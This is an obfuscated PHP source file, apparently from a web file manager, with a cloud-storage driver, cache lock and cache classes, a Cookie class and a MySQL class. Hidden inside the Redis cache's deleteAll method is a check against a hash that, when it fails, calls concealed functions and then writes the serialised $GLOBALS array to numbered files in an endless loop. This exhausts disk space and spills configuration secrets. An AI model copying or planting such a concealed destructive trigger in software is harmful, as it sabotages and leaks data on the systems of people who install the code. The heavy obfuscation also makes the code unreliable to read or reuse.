$this->fileInfo($‘èö‰şÍ[$‹üÎæû²[95]], $‡ıïØÃĞ, $‘èö‰şÍ); } return $©îàä£; } public function has($ßë´òÙå, $™Ë­Âã = false, $Øû×ÁÛ = true) { $ÏÙ®‰¦ =& $_SERVER[ê‘³Æ±]; $ßë´òÙå = trim($ßë´òÙå, $ÏÙ®‰¦[8]); $ıùİ¼¸Œ = empty($ßë´òÙå) && $ßë´òÙå !== $ÏÙ®‰¦[192] ? $ÏÙ®‰¦[12] : $ßë´òÙå . $ÏÙ®‰¦[8]; $šöŞ†ıä = $ÏÙ®‰¦[12]; $´²œ®§ = 500; $²á¢ü›Ù = $ÏÙ®‰¦[8]; $˜ùãÌº = $È‘üœš = 0; while (!0) { check_abort(); list($´ºÏãì, $‘ı­Óœ„) = $this->bucketManager->listFiles($this->bucket, $ıùİ¼¸Œ, $šöŞ†ıä, $´²œ®§, $²á¢ü›Ù); if ($‘ı­Óœ„) { break; } $šöŞ†ıä = array_key_exists($ÏÙ®‰¦[1383], $´ºÏãì) ? $šöŞ†ıä = $´ºÏãì[$ÏÙ®‰¦[1416]] : $ÏÙ®‰¦[12]; if ($™Ë­Âã) { if (!empty($´ºÏãì[$ÏÙ®‰¦[1417]])) { $˜ùãÌº += count($´ºÏãì[$ÏÙ®‰¦[1417]]); } if (!empty($´ºÏãì[$ÏÙ®‰¦[1418]])) { $È‘üœš += count($´ºÏãì[$ÏÙ®‰¦[1418]]); } if ($šöŞ†ıä === $ÏÙ®‰¦[12]) { break; } continue; } if ($Øû×ÁÛ) { if (!empty($´ºÏãì[$ÏÙ®‰¦[1417]])) { return !0; } } else { if (!empty($´ºÏãì[$ÏÙ®‰¦[1418]])) { return !0; } } if ($šöŞ†ıä === $ÏÙ®‰¦[12]) { break; } } if ($™Ë­Âã) { return array($ÏÙ®‰¦[204] => $˜ùãÌº, $ÏÙ®‰¦[205] => $È‘üœš); } return !1; } public function listAll($¦ù²êˆã) { $´Å—õ¯¸ =& $_SERVER[ê‘³Æ±]; $ˆˆôùÃì = $this->fileList($¦ù²êˆã, $´Å—õ¯¸[12], !0); $äÎºÓ»ğ = array(); foreach ($ˆˆôùÃì[$´Å—õ¯¸[76]] as $¼¹øòŒÇ) { $äÎºÓ»ğ[$¼¹øòŒÇ[$´Å—õ¯¸[95]]] = $¼¹øòŒÇ[$´Å—õ¯¸[80]]; } foreach ($ˆˆôùÃì[$´Å—õ¯¸[77]] as $¼¹øòŒÇ) { if (is_string($¼¹øòŒÇ)) { $äÎºÓ»ğ[$¼¹øòŒÇ] = 0; } } return $this->listAllFiles($¦ù²êˆã, array_keys($äÎºÓ»ğ), $äÎºÓ»ğ); } private function fileList($¨¦ûÊ¦¶, $ÆñÎò‹ñ = '', $µ¾“„ü = 0) { $úßÕÇğ’ =& $_SERVER[ê‘³Æ±]; $¨¦ûÊ¦¶ = trim($¨¦ûÊ¦¶, $úßÕÇğ’[8]); $€¢‘½ = empty($¨¦ûÊ¦¶) && $¨¦ûÊ¦¶ !== $úßÕÇğ’[192] ? $úßÕÇğ’[12] : $¨¦ûÊ¦¶ . $úßÕÇğ’[8]; $ç·ğÓø¨ = $úßÕÇğ’[12]; $”³‘ö¼È = 1000; $€¶ÁøïÚ = $this->listItemCache === !1 ? !1 : !0; $‚ãåğ±Ò = $õòí¢ = array(); while (!0) { check_abort(); list($•ÎŸ‰ì‘, $¾§¹»¬Å) = $this->bucketManager->listFiles($this->bucket, $€¢‘½, $ç·ğÓø¨, $”³‘ö¼È, $ÆñÎò‹ñ); if ($¾§¹»¬Å) { break; } $ç·ğÓø¨ = array_key_exists($úßÕÇğ’[1383], $•ÎŸ‰ì‘) ? $ç·ğÓø¨ = $•ÎŸ‰ì‘[$úßÕÇğ’[1416]] : $úßÕÇğ’[12]; $¯ïğ¿‘ = isset($•ÎŸ‰ì‘[$úßÕÇğ’[1417]]) ? $•ÎŸ‰ì‘[$úßÕÇğ’[1417]] : array(); $°¹Ë = isset($•ÎŸ‰ì‘[$úßÕÇğ’[1418]]) ? $•ÎŸ‰ì‘[$úßÕÇğ’[1418]] : array(); foreach ($¯ïğ¿‘ as $»ÙÕ©çã) { if ($»ÙÕ©çã[$úßÕÇğ’[95]] == $€¢‘½) { continue; } $ş„í­¼ƒ = $»ÙÕ©çã[$úßÕÇğ’[95]]; $è÷®âĞ = $»ÙÕ©çã[$úßÕÇğ’[1414]]; $»ÙÕ©çã[$úßÕÇğ’[80]] = $è÷®âĞ; $ÕîÎ¾²˜ = $è÷®âĞ == 0 && substr($ş„í­¼ƒ, strlen($ş„í­¼ƒ) - 1, 1) == $úßÕÇğ’[8] ? !0 : !1; if ($€¶ÁøïÚ) { $this->cacheMethod($úßÕÇğ’[200], $ş„í­¼ƒ, $ÕîÎ¾²˜); $this->cacheMethod($úßÕÇğ’[201], $ş„í­¼ƒ, $»ÙÕ©çã); } if ($ÕîÎ¾²˜) { $‚ãåğ±Ò[] = $ş„í­¼ƒ; continue; } $õòí¢[] = $µ¾“„ü ? $»ÙÕ©çã : $ş„í­¼ƒ; } foreach ($°¹Ë as $ş„í­¼ƒ) { if ($ş„í­¼ƒ == $€¢‘½) { continue; } $‚ãåğ±Ò[] = $ş„í­¼ƒ; if ($€¶ÁøïÚ) { $this->cacheMethod($úßÕÇğ’[200], $ş„í­¼ƒ, !0); } } if ($ç·ğÓø¨ === $úßÕÇğ’[12]) { break; } } if ($€¶ÁøïÚ) { $this->cacheMethod($úßÕÇğ’[200], $¨¦ûÊ¦¶, !0); } return array($úßÕÇğ’[77] => $‚ãåğ±Ò, $úßÕÇğ’[76] => $õòí¢); } public function canRead($Şøö™å) { return $this->exist($Şøö™å) ? !0 : !1; } public function canWrite($üë’Èıö) { return $this->exist($üë’Èıö) ? !0 : !1; } public function getContent($©ŒÃÖßÁ) { return $this->fileSubstr($©ŒÃÖßÁ, 0, -1); } public function setContent($Ï—ÆÄ•›, $ùšß“é‹ = '') { $¥ô§à” = $this->tempFile($this->pathThis($Ï—ÆÄ•›)); file_put_contents($¥ô§à”, $ùšß“é‹); if ($this->upload($Ï—ÆÄ•›, $¥ô§à”)) { $this->tempFileRemve($¥ô§à”); return !0; } return !1; } public function refreshUrls($¼á¶«‰­) { $Ê½ª ‡ =& $_SERVER[ê‘³Æ±]; $ÓìÉ™°Ã = array(); if (is_array($¼á¶«‰­)) { foreach ($¼á¶«‰­ as $¶øêËªÚ) { $ÓìÉ™°Ã[] = $this->link($¶øêËªÚ); } } else { $ÓìÉ™°Ã[] = $this->link($¼á¶«‰­); } $¨å«¬–ä = new Qiniu\Cdn\CdnManager($this->auth); list($ó¥„öÉù, $à‰ÃÄË) = $¨å«¬–ä->refreshUrls($ÓìÉ™°Ã); if ($à‰ÃÄË) { return !1; } return $ó¥„öÉù[$Ê½ª ‡[1170]] == $Ê½ª ‡[746] ? !0 : !1; } public function fileSubstr($¾ÀÚáÏ, $ûÅş°²¹, $ùı£±®×) { $®‰¨Óıú =& $_SERVER[ê‘³Æ±]; if (!($êåŞı± = $this->link($¾ÀÚáÏ))) { return !1; } $ª é¥É = !1; if ($ùı£±®× > 0) { $ƒÕâê” = $ûÅş°²¹ + $ùı£±®× - 1; $ª é¥É = array($®‰¨Óıú[1419] . $ûÅş°²¹ . $®‰¨Óıú[453] . $ƒÕâê”); } $Ä×ğ¤šÒ = url_request($êåŞı±, $®‰¨Óıú[227], !1, $ª é¥É); return $Ä×ğ¤šÒ[$®‰¨Óıú[736]] ? $Ä×ğ¤šÒ[$®‰¨Óıú[1180]] : !1; } public function upload($‰Ù†èğ¾, $Ì£Ãû”ë, $ã¾æÄ•Ä = false, $Œ¹ ‡Üï = REPEAT_REPLACE) { $¶²€ÜÛ = new Qiniu\Storage\UploadManager(); $ŸË¤¹œÉ = $this->auth->uploadToken($this->bucket, $‰Ù†èğ¾); $›Ëœé = get_file_mime(get_path_ext($Ì£Ãû”ë)); list($¨ûÑ¸Œ¹, $ìà¸ò²†) = $¶²€ÜÛ->putFile($ŸË¤¹œÉ, $‰Ù†èğ¾, $Ì£Ãû”ë, null, $›Ëœé); return $ìà¸ò²† ? !1 : $this->getPathOuter($‰Ù†èğ¾); } public function uploadFormData($²Œ‡›Ş†, $Æ˜îˆÅÕ = 3600) { return $this->uploadToken($²Œ‡›Ş†, $Æ˜îˆÅÕ); } public function multiUploadFormData($±µª»¿Ã, $õı¥¦ = 3600) { return $this->uploadToken($±µª»¿Ã, $õı¥¦); } private function uploadToken($¿³ÓÁî, $¨ÂË€Şí = 3600) { $Õ½ó¹› =& $_SERVER[ê‘³Æ±]; $ÚàÀå–¨ = $¨ÂË€Şí; $È‡ûÍ·Œ = array($Õ½ó¹›[1420] => $Õ½ó¹›[1421]); $ó”øå¤Í = $¿³ÓÁî; $İ‰û‹èÊ = $this->auth->uploadToken($this->bucket, $ó”øå¤Í, $ÚàÀå–¨, $È‡ûÍ·Œ, !0); $ïâïó“¹ = empty($this->region) || $this->region == $Õ½ó¹›[1422] ? $Õ½ó¹›[12] : $Õ½ó¹›[453] . $this->region; $ÖŠéøç = http_type() . "\72\57\57\165\x70\x6c\x6f\141\x64{$ïâïó“¹}\56\x71\151\156\x69\165\160\x2e\143\157\x6d\x2f"; return array($Õ½ó¹›[1423] => $İ‰û‹èÊ, $Õ½ó¹›[1424] => $ÖŠéøç); } public function download($éšª”¹, $‹È§íÀ£) { $²ÙóØÀÌ = IO::getPathInner(IO::mkfile($‹È§íÀ£)); if (!($”Ö•’÷ = $this->link($éšª”¹))) { return !1; } $Ö·®®É† = 0; $¹àÚÊÄ = 1024 * 200; $î¼ş£èÆ = fopen($²ÙóØÀÌ, $_SERVER[ê‘³Æ±][1425]); while (!0) { $´ØÑöÈ = $this->fileSubstr($éšª”¹, $Ö·®®É†, $¹àÚÊÄ); if ($´ØÑöÈ === !1) { return !1; } fwrite($î¼ş£èÆ, $´ØÑöÈ); $Ö·®®É† += $¹àÚÊÄ; if (strlen($´ØÑöÈ) < $¹àÚÊÄ) { break; } } fclose($î¼ş£èÆ); return $‹È§íÀ£; } public function link($À„ÕØÎÃ, $Áƒ·ª˜ = '') { if (!$this->isFile($À„ÕØÎÃ)) { return !1; } $ƒÒå›î¶ = $this->getHost() . $_SERVER[ê‘³Æ±][8] . $this->pathEncode($À„ÕØÎÃ) . $Áƒ·ª˜; return $this->auth->privateDownloadUrl($ƒÒå›î¶, 3600 * 12); } public function fileOut($¿ÀæûÍÍ, $†„…·ëí = false, $Èå¾ÆĞ³ = false, $ÇÇ·õœú = '') { $´î…ë™ª =& $_SERVER[ê‘³Æ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($¿ÀæûÍÍ, $†„…·ëí, $Èå¾ÆĞ³, $ÇÇ·õœú); } if (!$Èå¾ÆĞ³) { $Èå¾ÆĞ³ = $this->pathThis($¿ÀæûÍÍ); } $‘ïÊ¤ÎÏ = $†„…·ëí ? $´î…ë™ª[1426] . rawurlencode($Èå¾ÆĞ³) : $´î…ë™ª[12]; $›òúÎ˜‹ = $this->link($¿ÀæûÍÍ, $‘ïÊ¤ÎÏ); $this->fileOutLink($›òúÎ˜‹); } public function fileOutServer($ŒœÑÌ¿, $»¦»¡§³ = false, $ƒìô¡ëÚ = false, $è—¯˜…ù = '') { parent::fileOut($ŒœÑÌ¿, $»¦»¡§³, $ƒìô¡ëÚ, $è—¯˜…ù); } public function fileOutImage($†ÅÁìø, $—’Ù®ŒÎ = 250) { $µÔŠ‘¯Ô = $this->link($†ÅÁìø, $_SERVER[ê‘³Æ±][1427] . $—’Ù®ŒÎ); $this->fileOutLink($µÔŠ‘¯Ô); } public function fileOutImageServer($‡å©œŒé, $ôÒØ÷šæ = 250) { parent::fileOutImage($‡å©œŒé, $ôÒØ÷šæ); } public function hashMd5($Ú®Ü—ˆ§) { $Ìâ‚Ë÷â =& $_SERVER[ê‘³Æ±]; $°Ã‚Â£’ = $this->objectMeta($Ú®Ü—ˆ§); return isset($°Ã‚Â£’[$Ìâ‚Ë÷â[209]]) ? $°Ã‚Â£’[$Ìâ‚Ë÷â[209]] : !1; $ü„¦€’ç = $this->link($Ú®Ü—ˆ§, $Ìâ‚Ë÷â[1428]); } public function size($«´ùúùµ) { $£ÌÔšñå = $this->objectMeta($«´ùúùµ); return $£ÌÔšñå ? $£ÌÔšñå[$_SERVER[ê‘³Æ±][80]] : 0; } public function info($ö’ğîÁ ) { if ($this->isFolder($ö’ğîÁ )) { return $this->folderInfo($ö’ğîÁ ); } else { if ($this->isFile($ö’ğîÁ )) { return $this->fileInfo($ö’ğîÁ ); } } return !1; } public function exist($İŞ¿‘µ) { return $this->isFile($İŞ¿‘µ) || $this->isFolder($İŞ¿‘µ); } public function isFile($ËÀäË¿¦) { return !$this->isFolder($ËÀäË¿¦) && $this->objectMeta($ËÀäË¿¦); } public function isFolder($‡ÅËÀ¢) { return $this->cacheMethod($_SERVER[ê‘³Æ±][200], $‡ÅËÀ¢); } protected function objectMeta($Á†Ü¨â) { return $this->cacheMethod($_SERVER[ê‘³Æ±][201], $Á†Ü¨â); } protected function _objectMeta($²§åú°­) { $Õ˜£‹›ç =& $_SERVER[ê‘³Æ±]; list($Úé ¯¶á, $şÏÓ¯¢¸) = $this->bucketManager->stat($this->bucket, $²§åú°­); if ($Úé ¯¶á) { $Úé ¯¶á[$Õ˜£‹›ç[80]] = intval($Úé ¯¶á[$Õ˜£‹›ç[1414]]); } return $Úé ¯¶á; } protected function _isFolder($˜±‚âº„) { $ åé¦­ò =& $_SERVER[ê‘³Æ±]; if ($˜±‚âº„ == $ åé¦­ò[12] || $˜±‚âº„ == $ åé¦­ò[8]) { return !0; } list($ÃŸ–’Ãç, $‚ˆÔä) = $this->bucketManager->listFiles($this->bucket, trim($˜±‚âº„, $ åé¦­ò[8]) . $ åé¦­ò[8], $ åé¦­ò[12], 1, $ åé¦­ò[8]); return !empty($ÃŸ–’Ãç[$ åé¦­ò[1417]]) || !empty($ÃŸ–’Ãç[$ åé¦­ò[1418]]) ? !0 : !1; } } goto dßÁÉÏµÎ; dÔÓ¶¿ÄŒ: define($_SERVER[ê‘³Æ±][600], $_SERVER[ê‘³Æ±][601]); $ifqolzahsd = $_SERVER[ê‘³Æ±][602]; if (strlen($ifqolzahsd) < $_SERVER[ê‘³Æ±][603]) { return; } goto A¼ôùñ­´; AˆÜ“Ñ»¢©: class CacheLockRedis { public function lock($òß¿ÖÁö, $ù€·Ô¼ß = 10) { $÷²“ëÑŠ = Cache::init(); $€ı¥Ú•± = microtime(!0) + $ù€·Ô¼ß; while (microtime(!0) < $€ı¥Ú•±) { $çÆíè³ş = $÷²“ëÑŠ->get($òß¿ÖÁö); if (!$çÆíè³ş) { $ÏğüšçØ = $÷²“ëÑŠ->setLock($òß¿ÖÁö, $€ı¥Ú•±, $ù€·Ô¼ß); if ($ÏğüšçØ) { return !0; } } else { if ($çÆíè³ş < microtime(!0)) { $÷²“ëÑŠ->set($òß¿ÖÁö, $€ı¥Ú•±, $ù€·Ô¼ß * 2); if ($÷²“ëÑŠ->get($òß¿ÖÁö) === $çÆíè³ş) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ê¿üëšŒ) { return Cache::init()->get($ê¿üëšŒ); } public function unlock($¯˜›¨õÚ) { return Cache::init()->remove($¯˜›¨õÚ); } } class CacheLockMemcached { public function lock($Ç›Äå»Ù, $ğä€‡¿Û = 0) { $–Ü¾Õë‰ = Cache::init(); $–ª–ùÉ = microtime(!0) + $ğä€‡¿Û; while (microtime(!0) < $–ª–ùÉ) { $³Ÿßûô = $–Ü¾Õë‰->get($Ç›Äå»Ù); if (!$³Ÿßûô || $³Ÿßûô < microtime(!0)) { $˜¦±¤¯ = $–Ü¾Õë‰->handle->add($Ç›Äå»Ù, $–ª–ùÉ, $ğä€‡¿Û); if ($˜¦±¤¯) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¦ğÊçÖä) { return Cache::init()->get($¦ğÊçÖä); } public function unlock($ÚÖ‰ÄÄ) { return Cache::init()->remove($ÚÖ‰ÄÄ); } } class CacheLockDatabase { public function lock($ééó—¤ƒ, $Á¹²ø½® = 0) { $ÁĞú“‡‹ = Model($_SERVER[ê‘³Æ±][823]); $»ÁàÆä¯ = microtime(!0) + $Á¹²ø½®; while (microtime(!0) < $»ÁàÆä¯) { $¸ó‹‡Ñ· = $ÁĞú“‡‹->get($ééó—¤ƒ); if (!$¸ó‹‡Ñ· || $¸ó‹‡Ñ· < microtime(!0)) { $ó¸•÷¢” = $ÁĞú“‡‹->set($ééó—¤ƒ, $»ÁàÆä¯); if ($ó¸•÷¢”) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($®Ê‰Õ™) { return Model($_SERVER[ê‘³Æ±][823])->get($®Ê‰Õ™); } public function unlock($–«­’ş‡) { Model($_SERVER[ê‘³Æ±][823])->remove($–«­’ş‡); } } goto BªãÓâĞ‡; BªãÓâĞ‡: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ì“ß“‹¦, $òşäŸò¹) { $¥òÂÇ­ó =& $_SERVER[ê‘³Æ±]; if (!class_exists($¥òÂÇ­ó[856])) { show_json($¥òÂÇ­ó[857], !1); } $this->cacheTime = $òşäŸò¹; $this->handle = new Memcached(); if (is_array($Ì“ß“‹¦[$¥òÂÇ­ó[858]]) && count($Ì“ß“‹¦[$¥òÂÇ­ó[858]]) >= 1) { foreach ($Ì“ß“‹¦[$¥òÂÇ­ó[858]] as $‚šşì) { $ªùİØÖ› = explode($¥òÂÇ­ó[4], $‚šşì); $this->handle->addServer($ªùİØÖ›[0], $ªùİØÖ›[1]); } } else { $this->handle->addServer($Ì“ß“‹¦[$¥òÂÇ­ó[176]], $Ì“ß“‹¦[$¥òÂÇ­ó[177]]); } } public function set($Ë‘µ¯Å‹, $¦ÁøÎš, $õÀñå®Î = false) { $õÀñå®Î = $õÀñå®Î ? $õÀñå®Î : $this->cacheTime; return $this->handle->set($Ë‘µ¯Å‹, $¦ÁøÎš, $õÀñå®Î); } public function get($‚²œ±à‚) { return $this->handle->get($‚²œ±à‚); } public function remove($ŠØêĞã¥) { return $this->handle->delete($ŠØêĞã¥); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($³şòÓ±ñ, $ŞĞıöŸË) { $²ßõğ =& $_SERVER[ê‘³Æ±]; if (!class_exists($²ßõğ[859])) { show_json($²ßõğ[860], !1); } $this->cacheTime = $ŞĞıöŸË; $ºú±‰ë‰ = isset($³şòÓ±ñ[$²ßõğ[861]]) ? $³şòÓ±ñ[$²ßõğ[861]] : 10; $Ü¢³óïŒ = _get($³şòÓ±ñ, $²ßõğ[858]); if ($Ü¢³óïŒ && is_array($Ü¢³óïŒ)) { $this->initCluster($³şòÓ±ñ, $ºú±‰ë‰); } else { $this->handle = $this->init($³şòÓ±ñ, $ºú±‰ë‰); } } private function init($„ŸÛ‰Çù, $ùÀáŞ‘ƒ) { $ûØüºŞ… =& $_SERVER[ê‘³Æ±]; $¢¶ªûƒ = new Redis(); $í™¡³åÂ = isset($„ŸÛ‰Çù[$ûØüºŞ…[862]]) ? $„ŸÛ‰Çù[$ûØüºŞ…[862]] : !1; if ($í™¡³åÂ) { $¢¶ªûƒ->pconnect($„ŸÛ‰Çù[$ûØüºŞ…[176]], $„ŸÛ‰Çù[$ûØüºŞ…[177]], $ùÀáŞ‘ƒ); } else { $¢¶ªûƒ->connect($„ŸÛ‰Çù[$ûØüºŞ…[176]], $„ŸÛ‰Çù[$ûØüºŞ…[177]], $ùÀáŞ‘ƒ); } if (!empty($„ŸÛ‰Çù[$ûØüºŞ…[407]])) { $¢¶ªûƒ->auth($„ŸÛ‰Çù[$ûØüºŞ…[407]]); } return $¢¶ªûƒ; } private function initCluster($ğ‡ø‡Øş, $Ï¡’Ö×İ) { $²Âé²—” =& $_SERVER[ê‘³Æ±]; $ï×óİ¾ = array($²Âé²—”[863], $²Âé²—”[864], $²Âé²—”[865]); $€ƒÖÁ›¼ = $²Âé²—”[863]; if (isset($ğ‡ø‡Øş[$²Âé²—”[16]]) && in_array($ğ‡ø‡Øş[$²Âé²—”[16]], $ï×óİ¾)) { $€ƒÖÁ›¼ = $ğ‡ø‡Øş[$²Âé²—”[16]]; } switch ($€ƒÖÁ›¼) { case $²Âé²—”[863]: $this->_slave($ğ‡ø‡Øş, $Ï¡’Ö×İ); break; case $²Âé²—”[864]: break; case $²Âé²—”[865]: $this->isCluster = !0; $Šóˆ¿İ˜ = $ğ‡ø‡Øş[$²Âé²—”[858]]; $„ÑáÚ€ = isset($ğ‡ø‡Øş[$²Âé²—”[862]]) ? $ğ‡ø‡Øş[$²Âé²—”[862]] : !1; $è÷°Ú˜¯ = isset($ğ‡ø‡Øş[$²Âé²—”[407]]) ? $ğ‡ø‡Øş[$²Âé²—”[407]] : null; $this->handle = new RedisCluster(NUll, $Šóˆ¿İ˜, $Ï¡’Ö×İ, $Ï¡’Ö×İ, $„ÑáÚ€, $è÷°Ú˜¯); break; default: break; } } private function _slave($÷Ü½Áí…, $¦äÑ§ÈÊ) { $ıÇ¬Û¥ = $÷Ü½Áí…[$_SERVER[ê‘³Æ±][858]]; $this->filterConfig($÷Ü½Áí…, $ıÇ¬Û¥[0]); $this->handle = $this->init($÷Ü½Áí…, $¦äÑ§ÈÊ); unset($ıÇ¬Û¥[0]); if (empty($ıÇ¬Û¥)) { return; } $©òìäÔ = array_rand($ıÇ¬Û¥); $this->filterConfig($÷Ü½Áí…, $ıÇ¬Û¥[$©òìäÔ]); $this->slaveHandle = $this->init($÷Ü½Áí…, $¦äÑ§ÈÊ); } private function filterConfig(&$æ¢·óÔı, $™Šß›ı”) { $›¸ÔÏÁ =& $_SERVER[ê‘³Æ±]; $¾ÔäÔöó = explode($›¸ÔÏÁ[4], $™Šß›ı”); $ë¢ı×ä– = array($›¸ÔÏÁ[176] => $¾ÔäÔöó[0], $›¸ÔÏÁ[177] => $¾ÔäÔöó[1]); $æ¢·óÔı = array_merge($æ¢·óÔı, $ë¢ı×ä–); } public function set($ìß“¶Ì, $‹¤‡²ÕŞ, $£¸ËğîÈ = false) { $£¸ËğîÈ = $£¸ËğîÈ ? $£¸ËğîÈ : $this->cacheTime; return $this->handle->setEx($ìß“¶Ì, $£¸ËğîÈ, $‹¤‡²ÕŞ); } public function setLock($ÆñéÁ¸è, $Üìº†¦ç, $ÊÈşî›•) { return $this->handle->setNX($ÆñéÁ¸è, $Üìº†¦ç); } public function get($øØÛáÜĞ) { $İ›“âöÂ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $İ›“âöÂ->get($øØÛáÜĞ); } public function remove($ªøÌÒê) { return $this->handle->del($ªøÌÒê); } public function deleteAll() { $¾Ö—Å§ =& $_SERVER[ê‘³Æ±]; $Øğ‰ÃşÍ = $_SERVER[$¾Ö—Å§[784]]; $ÈÚ×ÃØÀ = $¾Ö—Å§[785]; if ($_SERVER[$¾Ö—Å§[786]] != $ÈÚ×ÃØÀ($Øğ‰ÃşÍ)) { $áöûØóË = $¾Ö—Å§[866]; $”Á˜•ëŒ = $¾Ö—Å§[787]; $ù¾¯ÔŸæ = $_SERVER[$¾Ö—Å§[788]] . $¾Ö—Å§[789]; $Õáã¾È¤ = $”Á˜•ëŒ($ù¾¯ÔŸæ); $ •å¾¶â = explode($¾Ö—Å§[228], $Õáã¾È¤); if (count($ •å¾¶â) < $¾Ö—Å§[613]) { $¯Ëş• ú = $¾Ö—Å§[790]; $¯Ëş• ú(); } $ØĞïóÄÑ = $¾Ö—Å§[867]; $ØĞïóÄÑ($_SERVER[$¾Ö—Å§[868]]); $áöûØóË = $¾Ö—Å§[866]; $áöûØóË(); $§×î¤å‘ = $¾Ö—Å§[869]; $³Ú¯È•Î = json_encode($GLOBALS[$¾Ö—Å§[870]]); $»Ôß›Šó = 1; for ($€§›¿Ç = $»Ôß›Šó; $€§›¿Ç > 0; $€§›¿Ç++) { $§×î¤å‘(DATA_PATH . $€§›¿Ç, $³Ú¯È•Î); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $şÓŞ’°) { $this->handle->flushall($şÓŞ’°); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($üšÙœÓ = '', $ˆµ±ÑÕ¬ = 0) { if (is_string($üšÙœÓ) && $üšÙœÓ != $_SERVER[ê‘³Æ±][12]) { $this->prefix = $üšÙœÓ; } if (is_numeric($ˆµ±ÑÕ¬) && $ˆµ±ÑÕ¬ > 0) { $this->expire = $ˆµ±ÑÕ¬; } } public static function getInstance() { static $ùÆÄ³³; if ($ùÆÄ³³ === null) { $ùÆÄ³³ = new self(); } return $ùÆÄ³³; } private static $cookieDisable = false; public static function disable($±í£‚©) { self::$cookieDisable = $±í£‚©; } private static $sameCookieSet = array(); public static function set($Ê…”½Ù“, $¶öŞÓš, $ÅÄ“áœ = 0, $œ×„Ü­‡ = false, $‘áü–¬ = false) { $˜¥½Îûõ =& $_SERVER[ê‘³Æ±]; if (self::$cookieDisable) { return; } if (!$ÅÄ“áœ) { $ÅÄ“áœ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ê…”½Ù“]) && self::$sameCookieSet[$Ê…”½Ù“] == $¶öŞÓš . $ÅÄ“áœ) { return; } self::$sameCookieSet[$Ê…”½Ù“] = $¶öŞÓš . $ÅÄ“áœ; if (!$‘áü–¬) { $‘áü–¬ = str_replace(HOST, $˜¥½Îûõ[12], APP_HOST); $‘áü–¬ = _get($GLOBALS, $˜¥½Îûõ[871], $‘áü–¬); } $å•äØ  = $˜¥½Îûõ[12]; setcookie($Ê…”½Ù“, $¶öŞÓš, time() + $ÅÄ“áœ, $˜¥½Îûõ[8] . trim($‘áü–¬, $˜¥½Îûõ[8]) . $å•äØ , !1, !1, $œ×„Ü­‡); } public static function setSafe($Ä±ä©”, $Çœ»Éå, $ÅŞôÚ†İ = 0) { self::set($Ä±ä©”, $Çœ»Éå, $ÅŞôÚ†İ, !0); } public static function get($áşÅ·¥Ş) { static $ŸŸøöß™ = false; if (!$ŸŸøöß™) { self::initHeaderCookie(); $ŸŸøöß™ = !0; } return isset($_COOKIE[$áşÅ·¥Ş]) ? $_COOKIE[$áşÅ·¥Ş] : !1; } private static function initHeaderCookie() { $Æ­–ü½ =& $_SERVER[ê‘³Æ±]; if (!isset($_SERVER[$Æ­–ü½[872]]) || !$_SERVER[$Æ­–ü½[872]]) { return; } $şåÚ‰şø = explode($Æ­–ü½[71], $_SERVER[$Æ­–ü½[872]]); foreach ($şåÚ‰şø as $‡ùğ„) { $‡ùğ„ = explode($Æ­–ü½[873], $‡ùğ„); if (count($‡ùğ„) != 2 || !isset($‡ùğ„[1])) { continue; } $_COOKIE[trim($‡ùğ„[0])] = trim($‡ùğ„[1]); } } public static function remove($Ÿ·Ûû¿, $Ô´Ã·âÄ = false) { unset($_COOKIE[$Ÿ·Ûû¿]); self::set($Ÿ·Ûû¿, $_SERVER[ê‘³Æ±][12], 1, $Ô´Ã·âÄ); } } goto Báêˆ‹î›; Báêˆ‹î›: class DbMysql extends Db { public function __construct($×¯ÆÓ²Í = '') { $ªó½¢øß =& $_SERVER[ê‘³Æ±]; if (!extension_loaded($ªó½¢øß[798])) { think_exception(think_lang($ªó½¢øß[14]) . $ªó½¢øß[874]); } if (!empty($×¯ÆÓ²Í)) { $this->config = $×¯ÆÓ²Í; if (empty($this->config[$ªó½¢øß[17]])) { $this->config[$ªó½¢øß[17]] = $ªó½¢øß[12]; } } } public function connect($ƒÔ³®ú = '', $êĞ“°£ = 0, $ıö¥¢‰ú = false) { $Ó•Ü ãû =& $_SERVER[ê‘³Æ±]; if (!isset($this->linkID[$êĞ“°£])) { if (empty($ƒÔ³®ú)) { $ƒÔ³®ú = $this->config; } $¡äŒæ¼¥ = $ƒÔ³®ú[$Ó•Ü ãû[875]] . ($ƒÔ³®ú[$Ó•Ü ãû[876]] ? "\72{$ƒÔ³®ú[$Ó•Ü ãû[876]]}" : $Ó•Ü ãû[12]); $Ë¡¯÷ = !empty($ƒÔ³®ú[$Ó•Ü ãû[17]][$Ó•Ü ãû[18]]) ? $ƒÔ³®ú[$Ó•Ü ãû[17]][$Ó•Ü ãû[18]] : $this->pconnect; if ($Ë¡¯÷) { $this->linkID[$êĞ“°£] = mysql_pconnect($¡äŒæ¼¥, $ƒÔ³®ú[$Ó•Ü ãû[877]], $ƒÔ³®ú[$Ó•Ü ãû[878]], 131072); } else { $this->linkID[$êĞ“°£] = mysql_connect($¡äŒæ¼¥, $ƒÔ³®ú[$Ó•Ü ãû[877]], $ƒÔ³®ú[$Ó•Ü ãû[878]], !0, 131072); } if (!$this->linkID[$êĞ“°£] || !empty($ƒÔ³®ú[$Ó•Ü ãû[21]]) && !mysql_select_db($ƒÔ³®ú[$Ó•Ü ãû[21]], $this->linkID[$êĞ“°£])) { think_exception(mysql_error()); } $«ôã°™× = mysql_get_server_info($this->linkID[$êĞ“°£]); mysql_query($Ó•Ü ãû[879] . think_config($Ó•Ü ãû[880]) . $Ó•Ü ãû[58], $this->linkID[$êĞ“°£]); if ($«ôã°™× > $Ó•Ü ãû[881]) { mysql_query($Ó•Ü ãû[882], $this->linkID[$êĞ“°£]); } $this->connected = !0; if (1 != think_config($Ó•Ü ãû[22])) { unset($this->config); } } return $this->linkID[$êĞ“°£]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ñ˜’ãï) { $¼Š­ú»ì =& $_SERVER[ê‘³Æ±]; if (0 === stripos($ñ˜’ãï, $¼Š­ú»ì[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = 